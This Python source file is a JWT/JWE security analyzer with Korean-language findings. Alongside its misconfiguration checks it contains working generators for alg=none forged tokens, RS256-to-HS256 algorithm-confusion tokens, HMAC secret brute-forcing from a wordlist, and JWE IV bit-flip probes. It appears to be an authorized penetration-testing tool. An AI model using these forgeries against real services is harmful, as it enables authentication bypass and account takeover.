#!/usr/bin/env python3
"""JWT structural/security analyzer -- handles both JWS and JWE.

A "JWT" is a container format; its content is either a JWS (3 segments:
header.payload.signature -- signed, payload readable without any key) or a
JWE (5 segments: header.encryptedKey.iv.ciphertext.tag -- encrypted,
ciphertext unreadable without the key). This tool detects which one it got
by counting dot-separated segments and analyzes accordingly.

For JWS tokens it flags common misconfigurations (alg=none, missing exp,
kid/jku/x5u injection surface, algorithm confusion exposure), and can
optionally:
  - brute-force a weak HMAC secret against a wordlist (local computation
    only, no network calls)
  - generate an alg=none PoC variant
  - generate an RS256->HS256 "algorithm confusion" PoC variant when given
    the server's public key

For JWE tokens it flags header-level misconfigurations (RSA1_5 key wrapping,
CBC-HS padding-oracle/bit-flipping surface, zip=DEF compression-oracle
surface, ECDH-ES invalid-curve exposure, weak PBES2 iteration count,
kid/jku/x5u injection surface) and can generate an IV bit-flip PoC variant.
It never attempts to decrypt a JWE -- there is no key material to do so with;
it only reasons about the plaintext protected header and ciphertext/IV/tag
lengths.

This tool only ANALYZES and GENERATES candidate tokens locally. It never
sends anything to a server itself -- testing a generated variant against a
real target is the user's own action, and only appropriate against systems
you're authorized to test.

Usage:
    python jwt_analyzer.py <token>
    python jwt_analyzer.py <token> --crack-secret
    python jwt_analyzer.py <token> --crack-secret --wordlist common-passwords.txt --limit 50000
    python jwt_analyzer.py <token> --gen-none
    python jwt_analyzer.py <token> --confusion-pubkey server_public_key.pem
    python jwt_analyzer.py <jwe_token> --gen-jwe-ivflip
    python jwt_analyzer.py --file token.txt
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import logging
import sys
import time
from dataclasses import dataclass
from pathlib import Path

logger = logging.getLogger("jwt_analyzer")

SECLISTS_PASSWORDS_DIR = Path(__file__).resolve().parent.parent / "SecLists-master" / "Passwords"
DEFAULT_SECRET_WORDLIST = SECLISTS_PASSWORDS_DIR / "scraped-JWT-secrets.txt"
DEFAULT_CRACK_LIMIT = 500_000

_HMAC_ALGS: dict[str, "hashlib._Hash"] = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
_ASYMMETRIC_ALGS = ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512")


# ---------------------------------------------------------------------------
# base64url helpers
# ---------------------------------------------------------------------------
def b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


# ---------------------------------------------------------------------------
# Parsing
# ---------------------------------------------------------------------------
@dataclass
class Finding:
    severity: str  # INFO / WARNING / VULNERABLE
    message: str


@dataclass
class JwtParts:
    header_raw: str
    payload_raw: str
    signature_raw: str
    header: dict
    payload: dict
    signature: bytes


def parse_jwt(token: str) -> JwtParts:
    token = token.strip()
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"3파트(header.payload.signature) 구조가 아님 (segment {len(parts)}개 발견)")
    header_raw, payload_raw, signature_raw = parts
    try:
        header = json.loads(b64url_decode(header_raw))
        payload = json.loads(b64url_decode(payload_raw))
    except (ValueError, UnicodeDecodeError) as exc:
        raise ValueError(f"base64url 디코딩 또는 JSON 파싱 실패: {exc}") from exc
    signature = b64url_decode(signature_raw) if signature_raw else b""
    return JwtParts(header_raw, payload_raw, signature_raw, header, payload, signature)


@dataclass
class JweParts:
    header_raw: str
    encrypted_key_raw: str
    iv_raw: str
    ciphertext_raw: str
    tag_raw: str
    header: dict
    encrypted_key: bytes
    iv: bytes
    ciphertext: bytes
    tag: bytes


def parse_jwe(token: str) -> JweParts:
    token = token.strip()
    parts = token.split(".")
    if len(parts) != 5:
        raise ValueError(f"5파트(header.encryptedKey.iv.ciphertext.tag) 구조가 아님 (segment {len(parts)}개 발견)")
    header_raw, ek_raw, iv_raw, ct_raw, tag_raw = parts
    try:
        header = json.loads(b64url_decode(header_raw))
    except (ValueError, UnicodeDecodeError) as exc:
        raise ValueError(f"protected header base64url 디코딩 또는 JSON 파싱 실패: {exc}") from exc
    # ciphertext는 암호화돼 있어 키 없이는 못 읽음 -- 세그먼트 길이/구조만 분석한다.
    encrypted_key = b64url_decode(ek_raw) if ek_raw else b""
    iv = b64url_decode(iv_raw) if iv_raw else b""
    ciphertext = b64url_decode(ct_raw) if ct_raw else b""
    tag = b64url_decode(tag_raw) if tag_raw else b""
    return JweParts(header_raw, ek_raw, iv_raw, ct_raw, tag_raw, header, encrypted_key, iv, ciphertext, tag)


def detect_and_parse(token: str) -> tuple[str, "JwtParts | JweParts"]:
    """세그먼트 개수로 JWS(3)/JWE(5)를 구분해 맞는 파서로 디코딩한다."""
    segment_count = token.strip().count(".") + 1
    if segment_count == 3:
        return "JWS", parse_jwt(token)
    if segment_count == 5:
        return "JWE", parse_jwe(token)
    raise ValueError(f"JWS(3파트)도 JWE(5파트)도 아님 (segment {segment_count}개 발견) -- JWT가 아니거나 잘린 토큰일 수 있음")


# ---------------------------------------------------------------------------
# Structural / security analysis
# ---------------------------------------------------------------------------
def analyze_structure(jwt: JwtParts) -> list[Finding]:
    findings: list[Finding] = []
    alg = str(jwt.header.get("alg", ""))
    alg_upper = alg.upper()

    if alg.lower() == "none":
        findings.append(Finding("VULNERABLE", "alg=none: 서버가 이를 받아들이면 서명 검증 없이 payload 위조 가능."))
    elif not jwt.signature:
        findings.append(Finding("WARNING", "서명이 비어 있음 (alg은 none이 아님) — 토큰이 잘렸거나 서명이 누락됨."))

    if "exp" not in jwt.payload:
        findings.append(Finding("WARNING", "exp(만료시간) claim 없음 — 토큰이 영구적으로 유효할 수 있음."))
    else:
        exp = jwt.payload.get("exp")
        if isinstance(exp, (int, float)):
            remaining = exp - time.time()
            if remaining < 0:
                findings.append(Finding("INFO", f"토큰 만료됨 ({-remaining:.0f}초 전)."))
            elif remaining > 60 * 60 * 24 * 365:
                findings.append(Finding("WARNING", f"만료까지 {remaining / 86400:.0f}일 남음 — 과도하게 긴 유효기간."))

    if "iat" not in jwt.payload:
        findings.append(Finding("INFO", "iat(발급시간) claim 없음."))

    if "kid" in jwt.header:
        findings.append(
            Finding(
                "WARNING",
                f"kid 헤더 존재 ({jwt.header['kid']!r}) — 서버가 이 값으로 키 파일/DB를 직접 조회한다면 "
                "경로 조작(path traversal)이나 SQL 인젝션 벡터가 될 수 있음.",
            )
        )
    if "jku" in jwt.header:
        findings.append(
            Finding("WARNING", f"jku 헤더 존재 ({jwt.header['jku']!r}) — 서버가 이 URL에서 공개키를 fetch한다면 SSRF/키 위조 벡터.")
        )
    if "x5u" in jwt.header:
        findings.append(Finding("WARNING", "x5u 헤더 존재 — 서버가 이 URL의 인증서를 신뢰한다면 위조 인증서 주입 벡터."))

    if alg_upper in _HMAC_ALGS:
        findings.append(Finding("INFO", f"{alg}: 대칭키(HMAC) 서명 — 시크릿이 약하면 --crack-secret으로 무차별 대입 가능."))
    elif alg_upper in _ASYMMETRIC_ALGS:
        findings.append(
            Finding(
                "INFO",
                f"{alg}: 비대칭키 서명 — 서버 검증 로직이 공개키를 HMAC 시크릿으로 오인하면 "
                "algorithm confusion 공격 가능 (--confusion-pubkey 참고).",
            )
        )
    elif alg_upper and alg_upper not in ("NONE",):
        findings.append(Finding("INFO", f"알 수 없거나 드문 alg 값: {alg!r}"))

    return findings


_JWE_VULNERABLE_ALG = {"RSA1_5"}
_JWE_DIRECT_ALG = {"dir"}
_JWE_ECDH_ALG = {"ECDH-ES", "ECDH-ES+A128KW", "ECDH-ES+A192KW", "ECDH-ES+A256KW"}
_JWE_PBES2_ALG = {"PBES2-HS256+A128KW", "PBES2-HS384+A192KW", "PBES2-HS512+A256KW"}
_JWE_CBC_HS_ENC = {"A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"}
_JWE_GCM_ENC = {"A128GCM", "A192GCM", "A256GCM"}
_JWE_EXPECTED_TAG_LEN = {
    "A128GCM": 16, "A192GCM": 16, "A256GCM": 16,
    "A128CBC-HS256": 16, "A192CBC-HS384": 24, "A256CBC-HS512": 32,
}


def analyze_structure_jwe(jwe: JweParts) -> list[Finding]:
    findings: list[Finding] = []
    header = jwe.header
    alg = str(header.get("alg", ""))
    enc = str(header.get("enc", ""))

    if alg.upper() == "NONE":
        findings.append(Finding("VULNERABLE", "alg=none: JWE 스펙엔 정의되지 않은 값 -- 서버가 받아들이면 키 래핑 자체가 생략될 수 있음(라이브러리 구현 버그 가능성)."))
    elif alg in _JWE_VULNERABLE_ALG:
        findings.append(Finding(
            "VULNERABLE",
            f"alg={alg}: RSAES-PKCS1-v1_5 키 래핑 -- Bleichenbacher류 패딩 오라클 공격에 취약한 것으로 알려져 "
            "RFC 8725에서 사용 금지 권고함. 서버가 복호화 실패 시 응답/오류 메시지/타이밍으로 패딩 유효성을 "
            "흘리는지 직접 확인해볼 것.",
        ))
    elif alg in _JWE_DIRECT_ALG:
        findings.append(Finding("INFO", "alg=dir: 키 래핑 없이 CEK를 직접 공유 -- 발급자·검증자가 enc 길이에 맞는 대칭키를 그대로 공유해야 함."))
    elif alg in _JWE_ECDH_ALG:
        findings.append(Finding(
            "WARNING",
            f"alg={alg}: ECDH 키 합의 -- 서버가 수신한 ephemeral public key(epk, 아래 참고)의 곡선 소속 여부를 "
            "검증 안 하면 Invalid Curve Attack으로 개인키 복구가 가능함.",
        ))
    elif alg in _JWE_PBES2_ALG:
        p2c = header.get("p2c")
        if not isinstance(p2c, int) or p2c < 1000:
            findings.append(Finding("WARNING", f"alg={alg}: PBES2 반복 횟수(p2c)={p2c!r} -- 낮거나 없으면 패스워드 브루트포스가 빨라짐 (권장 최소 1000+)."))
        else:
            findings.append(Finding("INFO", f"alg={alg}: PBES2 패스워드 기반 키 래핑, p2c={p2c}."))
    elif alg:
        findings.append(Finding("INFO", f"알 수 없거나 드문 alg 값: {alg!r}"))
    else:
        findings.append(Finding("WARNING", "alg 헤더 없음 -- JWE라면 필수 claim인데 누락됨."))

    if enc in _JWE_CBC_HS_ENC:
        findings.append(Finding(
            "WARNING",
            f"enc={enc}: MAC-then-encrypt 구성(AEAD가 아니라 JOSE 스펙 자체 조합) -- 구현에 따라 padding "
            "oracle/bit-flipping 공격 표면이 됨. IV/ciphertext는 서명 없이 그대로 노출돼 있어 공격자가 수정 "
            "가능한 영역 -- --gen-jwe-ivflip으로 변조본을 만들어 서버 오류 응답 차이를 직접 확인해볼 것.",
        ))
    elif enc in _JWE_GCM_ENC:
        findings.append(Finding("INFO", f"enc={enc}: AEAD(GCM) -- 구조적으로 CBC-HS보다 안전하나, 같은 키로 IV(nonce)가 재사용되면 치명적."))
    elif enc:
        findings.append(Finding("INFO", f"알 수 없거나 드문 enc 값: {enc!r}"))
    else:
        findings.append(Finding("WARNING", "enc 헤더 없음 -- JWE라면 필수 claim인데 누락됨."))

    if header.get("zip") == "DEF":
        findings.append(Finding("WARNING", "zip=DEF: 암호화 전 압축 -- 공격자가 평문 일부를 주입해 압축률로 나머지를 추론하는 CRIME류 압축 오라클 공격 표면."))

    if "epk" in header:
        findings.append(Finding("INFO", "epk(ephemeral public key) 헤더에 그대로 노출됨 -- ECDH-ES일 때 정상이지만, 서버가 곡선 검증을 생략하면 위 Invalid Curve 공격의 입력이 됨."))
    if "kid" in header:
        findings.append(Finding("WARNING", f"kid 헤더 존재 ({header['kid']!r}) -- 서버가 이 값으로 키 파일/DB를 직접 조회한다면 경로 조작(path traversal)이나 SQL 인젝션 벡터가 될 수 있음."))
    if "jku" in header:
        findings.append(Finding("WARNING", f"jku 헤더 존재 ({header['jku']!r}) -- 서버가 이 URL에서 공개키를 fetch한다면 SSRF/키 위조 벡터."))
    if "x5u" in header:
        findings.append(Finding("WARNING", "x5u 헤더 존재 -- 서버가 이 URL의 인증서를 신뢰한다면 위조 인증서 주입 벡터."))

    if alg in _JWE_DIRECT_ALG and jwe.encrypted_key:
        findings.append(Finding("WARNING", "alg=dir인데 encrypted_key 세그먼트가 비어있지 않음 -- 스펙 위반이거나 비표준 구현."))
    if alg and alg not in _JWE_DIRECT_ALG and not jwe.encrypted_key:
        findings.append(Finding("WARNING", "alg=dir가 아닌데 encrypted_key 세그먼트가 비어있음 -- 잘린 토큰이거나 비표준 구현."))

    expected_tag_len = _JWE_EXPECTED_TAG_LEN.get(enc)
    if expected_tag_len is not None and jwe.tag and len(jwe.tag) != expected_tag_len:
        findings.append(Finding("WARNING", f"enc={enc} 기준 예상 태그 길이는 {expected_tag_len}바이트인데 실제 {len(jwe.tag)}바이트 -- 잘렸거나 변조됐을 수 있음."))

    findings.append(Finding("INFO", "JWE payload(ciphertext)는 키 없이는 복호화 불가 -- 이 도구는 키 복구나 복호화를 시도하지 않고 헤더/구조만 분석·변조함."))

    return findings


# ---------------------------------------------------------------------------
# PoC variant generators (local only -- never sent anywhere by this tool)
# ---------------------------------------------------------------------------
def gen_none_alg_variant(jwt: JwtParts) -> str:
    header = dict(jwt.header)
    header["alg"] = "none"
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(jwt.payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def gen_confusion_variant(jwt: JwtParts, pubkey_bytes: bytes, target_alg: str = "HS256") -> str:
    """Classic RS/ES/PS -> HS confusion PoC: signs with HMAC using the
    server's own public key bytes as the secret. Only meaningful against a
    server whose JWT library naively uses one 'key' parameter for both
    RSA verification and HMAC verification."""
    digestmod = _HMAC_ALGS.get(target_alg.upper())
    if digestmod is None:
        raise ValueError(f"target_alg must be one of {list(_HMAC_ALGS)}, got {target_alg!r}")
    header = dict(jwt.header)
    header["alg"] = target_alg.upper()
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(jwt.payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(pubkey_bytes, signing_input, digestmod).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"


def gen_jwe_ivflip_variant(jwe: JweParts, byte_index: int = -1) -> str:
    """IV의 지정 바이트를 1비트 뒤집어(XOR 0x01) 재인코딩한 compact JWE를 돌려준다.
    아무 것도 전송하지 않음 -- CBC 계열 enc에서 padding-oracle/bit-flipping 탐지용
    1차 변조본으로, 사용자가 직접 허가된 대상에 보내 응답/오류/타이밍 차이를
    관찰하는 용도. ciphertext/tag는 원본 그대로라 복호화는 당연히 실패하지만,
    그 "실패하는 방식"(패딩 오류 vs MAC 오류 vs 일반 오류)이 공격 표면이 된다."""
    iv = bytearray(jwe.iv)
    if not iv:
        raise ValueError("IV 세그먼트가 비어 있어 bit-flip할 대상이 없음 (잘린 토큰이거나 비표준 구성).")
    idx = byte_index if byte_index >= 0 else len(iv) + byte_index
    if not (0 <= idx < len(iv)):
        raise ValueError(f"byte_index={byte_index}가 IV 길이({len(iv)}바이트) 범위를 벗어남.")
    iv[idx] ^= 0x01
    iv_b64 = b64url_encode(bytes(iv))
    return f"{jwe.header_raw}.{jwe.encrypted_key_raw}.{iv_b64}.{jwe.ciphertext_raw}.{jwe.tag_raw}"


# ---------------------------------------------------------------------------
# Weak-secret brute force (local HMAC recomputation, no network)
# ---------------------------------------------------------------------------
def resolve_wordlist_path(spec: str) -> Path:
    direct = Path(spec)
    if direct.is_file():
        return direct
    for candidate in (SECLISTS_PASSWORDS_DIR / spec, SECLISTS_PASSWORDS_DIR / "Common-Credentials" / spec):
        if candidate.is_file():
            return candidate
    raise FileNotFoundError(f"Wordlist not found: {spec!r} (checked as a direct path and under {SECLISTS_PASSWORDS_DIR})")


def crack_secret(jwt: JwtParts, wordlist_path: Path, limit: int) -> tuple[str | None, int]:
    alg_upper = str(jwt.header.get("alg", "")).upper()
    digestmod = _HMAC_ALGS.get(alg_upper)
    if digestmod is None:
        raise ValueError(f"alg={alg_upper!r}는 HMAC이 아니라 secret brute-force 대상이 아님 (HS256/HS384/HS512만 지원).")

    signing_input = f"{jwt.header_raw}.{jwt.payload_raw}".encode()
    target_sig = jwt.signature

    count = 0
    with wordlist_path.open("r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            word = line.rstrip("\n\r")
            if not word:
                continue
            count += 1
            if count > limit:
                break
            candidate = hmac.new(word.encode("utf-8"), signing_input, digestmod).digest()
            if hmac.compare_digest(candidate, target_sig):
                return word, count
    return None, count


def _emit_json(report: dict, output_file: str | None) -> None:
    text = json.dumps(report, indent=2, ensure_ascii=False)
    if output_file:
        Path(output_file).write_text(text, encoding="utf-8")
    else:
        print(text)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="jwt_analyzer", description="JWT structural/security analyzer.")
    parser.add_argument("token", nargs="?", default=None, help="JWT string (header.payload.signature)")
    parser.add_argument("--file", default=None, help="Read the token from this file instead of the positional arg")
    parser.add_argument("--crack-secret", action="store_true", help="Brute-force the HMAC secret against a wordlist (HS256/384/512 only)")
    parser.add_argument(
        "--wordlist",
        default=str(DEFAULT_SECRET_WORDLIST),
        help="Path or short name for --crack-secret (default: SecLists scraped-JWT-secrets.txt)",
    )
    parser.add_argument("--limit", type=int, default=DEFAULT_CRACK_LIMIT, help=f"Max words to try for --crack-secret (default {DEFAULT_CRACK_LIMIT})")
    parser.add_argument("--gen-none", action="store_true", help="Print an alg=none PoC variant of the token")
    parser.add_argument("--confusion-pubkey", default=None, help="Path to the server's public key (PEM) to generate an RS/ES/PS->HS confusion PoC")
    parser.add_argument("--confusion-alg", default="HS256", choices=list(_HMAC_ALGS), help="Target HMAC alg for --confusion-pubkey (default HS256)")
    parser.add_argument("--gen-jwe-ivflip", action="store_true", help="JWE(5-part) only: print an IV bit-flip PoC variant (padding-oracle/bit-flipping probe)")
    parser.add_argument("--ivflip-byte", type=int, default=-1, help="IV byte index to flip for --gen-jwe-ivflip (default: last byte, negative = from end)")
    parser.add_argument("--output", choices=["console", "json"], default="console", help="Report format (default console)")
    parser.add_argument("--output-file", default=None, help="Write report to this path instead of stdout (both --output modes)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose logging")
    return parser


def _interactive_argv(parser: argparse.ArgumentParser) -> list[str] | None:
    """Number-driven interactive menu: builds an argv list from the parser's own
    option definitions, so it stays in sync automatically as options change."""
    positionals = [a for a in parser._actions if not a.option_strings]
    optionals = [a for a in parser._actions if a.option_strings and a.dest != "help"]

    print(f"\n=== {parser.prog} 대화형 모드 ===")
    print("(필수 값부터 입력 -> 옵션은 번호로 설정/토글 -> 0=실행, q=취소)\n")

    pos_values: dict[str, str] = {}
    for act in positionals:
        optional_pos = act.nargs == "?"
        suffix = " [선택, Enter=생략]" if optional_pos else ""
        label = f"{act.dest}" + (f" ({act.help})" if act.help else "") + suffix
        while True:
            v = input(f"{label}: ").strip()
            if v:
                pos_values[act.dest] = v
                break
            if optional_pos:
                break
            print("  필수 입력값입니다.")

    opt_values: dict[str, object] = {}
    while True:
        print("\n-- 옵션 목록 --")
        for i, act in enumerate(optionals, start=1):
            name = act.option_strings[0]
            if isinstance(act, argparse._StoreTrueAction):
                state = "ON" if opt_values.get(act.dest) else "off"
            elif isinstance(act, argparse._AppendAction):
                cur = opt_values.get(act.dest) or []
                state = f"{len(cur)}개 등록됨" if cur else "(없음)"
            elif act.dest in opt_values:
                v = opt_values[act.dest]
                state = "(기본값 사용)" if v is True else str(v)
            else:
                state = f"(기본값: {act.default})" if act.default is not None else "(미설정)"
            req = " *필수" if getattr(act, "required", False) else ""
            choices = f" 선택지:{','.join(map(str, act.choices))}" if act.choices else ""
            print(f"  {i:>2}. {name:<20} = {state:<22}{req}  {act.help or ''}{choices}")
        choice = input("\n번호 선택 (0=실행, q=취소): ").strip().lower()
        if choice == "q":
            return None
        if choice == "0":
            missing = [a.option_strings[0] for a in optionals if getattr(a, "required", False) and a.dest not in opt_values]
            if missing:
                print(f"  필수 옵션 미설정: {', '.join(missing)}")
                continue
            break
        if not choice.isdigit() or not (1 <= int(choice) <= len(optionals)):
            print("  잘못된 번호입니다.")
            continue
        act = optionals[int(choice) - 1]
        if isinstance(act, argparse._StoreTrueAction):
            opt_values[act.dest] = not opt_values.get(act.dest, False)
        elif isinstance(act, argparse._AppendAction):
            print(f"  {act.option_strings[0]} 값 반복 입력, 빈 줄이면 종료:")
            items: list[str] = []
            while True:
                v = input("    + ").strip()
                if not v:
                    break
                items.append(v)
            opt_values[act.dest] = items
        elif act.nargs == "?":
            v = input(f"  {act.option_strings[0]} 값 (비우고 Enter=기본값 '{act.const}' 사용): ").strip()
            opt_values[act.dest] = v if v else True
        else:
            v = input(f"  {act.option_strings[0]} 값 (빈 줄=설정 해제): ").strip()
            if v:
                opt_values[act.dest] = v
            else:
                opt_values.pop(act.dest, None)

    argv: list[str] = [pos_values[a.dest] for a in positionals if a.dest in pos_values]
    for act in optionals:
        if act.dest not in opt_values:
            continue
        val = opt_values[act.dest]
        if isinstance(act, argparse._StoreTrueAction):
            if val:
                argv.append(act.option_strings[0])
        elif isinstance(act, argparse._AppendAction):
            for item in val:
                argv += [act.option_strings[0], item]
        elif act.nargs == "?":
            argv.append(act.option_strings[0])
            if val is not True:
                argv.append(val)
        else:
            argv += [act.option_strings[0], str(val)]
    return argv


def main(argv: list[str] | None = None) -> int:
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass

    parser = build_arg_parser()
    args = parser.parse_args(argv)
    logging.basicConfig(level=logging.DEBUG if args.verbose else logging.INFO, format="%(message)s", stream=sys.stderr)

    if args.file:
        token = Path(args.file).read_text(encoding="utf-8").strip()
    elif args.token:
        token = args.token
    else:
        parser.error("token 인자 또는 --file 중 하나는 필요함")
        return 2

    try:
        kind, parsed = detect_and_parse(token)
    except ValueError as exc:
        logger.error("파싱 실패: %s", exc)
        if args.output == "json":
            _emit_json({"error": str(exc)}, args.output_file)
        return 2

    if kind == "JWE" and (args.gen_none or args.confusion_pubkey or args.crack_secret):
        logger.error("--gen-none/--confusion-pubkey/--crack-secret은 JWS(3파트, 서명) 전용임 -- 이 토큰은 JWE(5파트, 암호화)임.")
        return 2
    if kind == "JWS" and args.gen_jwe_ivflip:
        logger.error("--gen-jwe-ivflip은 JWE(5파트, 암호화) 전용임 -- 이 토큰은 JWS(3파트, 서명)임.")
        return 2

    if kind == "JWS":
        jwt = parsed
        findings = analyze_structure(jwt)
        report: dict = {
            "type": "JWS",
            "header": jwt.header,
            "payload": jwt.payload,
            "findings": [{"severity": f.severity, "message": f.message} for f in findings],
        }

        none_variant = gen_none_alg_variant(jwt) if args.gen_none else None
        if none_variant is not None:
            report["gen_none_variant"] = none_variant

        confusion_variant = None
        if args.confusion_pubkey:
            pubkey_bytes = Path(args.confusion_pubkey).read_bytes()
            confusion_variant = gen_confusion_variant(jwt, pubkey_bytes, args.confusion_alg)
            report["confusion_variant"] = {"alg": args.confusion_alg, "token": confusion_variant}

        crack_result: dict | None = None
        if args.crack_secret:
            try:
                wordlist_path = resolve_wordlist_path(args.wordlist)
            except FileNotFoundError as exc:
                logger.error(str(exc))
                if args.output == "json":
                    _emit_json({"error": str(exc)}, args.output_file)
                return 2
            start = time.monotonic()
            found, tried = crack_secret(jwt, wordlist_path, args.limit)
            elapsed = time.monotonic() - start
            crack_result = {"wordlist": str(wordlist_path), "tried": tried, "elapsed_seconds": round(elapsed, 1), "found": found}
            report["crack_secret"] = crack_result

        if args.output == "json":
            _emit_json(report, args.output_file)
            return 0

        print("=" * 60)
        print(" JWT Analysis -- type: JWS (서명)")
        print("=" * 60)
        print("\n[Header]")
        print(json.dumps(jwt.header, indent=2, ensure_ascii=False))
        print("\n[Payload]")
        print(json.dumps(jwt.payload, indent=2, ensure_ascii=False))

        print(f"\n[Findings] ({len(findings)})")
        for f in findings:
            print(f"  {f.severity:<10} {f.message}")

        if none_variant is not None:
            print("\n[alg=none PoC variant]")
            print(f"  {none_variant}")

        if confusion_variant is not None:
            print(f"\n[{args.confusion_alg} confusion PoC variant (signed with public key bytes as HMAC secret)]")
            print(f"  {confusion_variant}")

        if crack_result is not None:
            print(f"\n[Secret brute force] wordlist={crack_result['wordlist']} limit={args.limit}")
            if crack_result["found"] is not None:
                print(f"  FOUND after {crack_result['tried']} word(s) in {crack_result['elapsed_seconds']}s: {crack_result['found']!r}")
            else:
                print(f"  Not found after {crack_result['tried']} word(s) in {crack_result['elapsed_seconds']}s.")

        return 0

    # kind == "JWE"
    jwe = parsed
    findings = analyze_structure_jwe(jwe)
    report = {
        "type": "JWE",
        "header": jwe.header,
        "payload": "(암호화됨 -- 키 없이는 복호화 불가, 이 도구는 복호화를 시도하지 않음)",
        "segment_lengths_bytes": {
            "encrypted_key": len(jwe.encrypted_key),
            "iv": len(jwe.iv),
            "ciphertext": len(jwe.ciphertext),
            "tag": len(jwe.tag),
        },
        "findings": [{"severity": f.severity, "message": f.message} for f in findings],
    }

    ivflip_variant = None
    if args.gen_jwe_ivflip:
        try:
            ivflip_variant = gen_jwe_ivflip_variant(jwe, args.ivflip_byte)
        except ValueError as exc:
            logger.error(str(exc))
            if args.output == "json":
                _emit_json({"error": str(exc)}, args.output_file)
            return 2
        report["gen_jwe_ivflip_variant"] = {"byte_index": args.ivflip_byte, "token": ivflip_variant}

    if args.output == "json":
        _emit_json(report, args.output_file)
        return 0

    print("=" * 60)
    print(" JWT Analysis -- type: JWE (암호화)")
    print("=" * 60)
    print("\n[Protected Header]")
    print(json.dumps(jwe.header, indent=2, ensure_ascii=False))
    print(f"\n[Payload] 암호화됨 -- 키 없이는 복호화 불가 (ciphertext {len(jwe.ciphertext)} bytes)")
    print(f"[Segments] encrypted_key={len(jwe.encrypted_key)}B  iv={len(jwe.iv)}B  tag={len(jwe.tag)}B")

    print(f"\n[Findings] ({len(findings)})")
    for f in findings:
        print(f"  {f.severity:<10} {f.message}")

    if ivflip_variant is not None:
        print(f"\n[IV bit-flip PoC variant (byte_index={args.ivflip_byte})]")
        print(f"  {ivflip_variant}")
        print("  이 토큰을 자동 전송하지 않음 -- 허가된 대상에 직접 보내 복호화 오류 응답/타이밍 차이를 관찰할 것.")

    return 0


if __name__ == "__main__":
    for _stream in (sys.stdout, sys.stderr):
        try:
            _stream.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass
    if len(sys.argv) == 1:
        try:
            _argv = _interactive_argv(build_arg_parser())
        except (EOFError, KeyboardInterrupt):
            print("\n입력이 중단됨 -- 취소됨.")
            raise SystemExit(130)
        if _argv is None:
            print("취소됨.")
            raise SystemExit(0)
        raise SystemExit(main(_argv))
    raise SystemExit(main())
